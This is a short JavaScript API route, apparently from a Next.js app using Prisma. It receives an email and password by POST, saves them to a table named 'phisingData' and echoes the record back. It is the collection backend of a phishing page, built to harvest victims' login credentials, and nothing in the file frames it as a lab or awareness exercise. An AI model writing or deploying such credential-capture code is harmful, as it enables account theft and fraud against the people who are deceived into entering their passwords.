import prisma from '../../../lib/prisma';

export default async function (req, res) {
  if (req.method === 'POST') {
    try {
      const { email, password } = req.body;

      const phised_details_of_user = await prisma.phisingData.create({
        data: {
          username: email,
          password: password,
          source: 'web',
        },
      });

      res.status(200).json(phised_details_of_user);
    } catch (error) {
      res.status(500).json(error);
    }
  } else {
    res.status(500).json({
      error: true,
      message: 'Method not allowed',
    });
  }
}
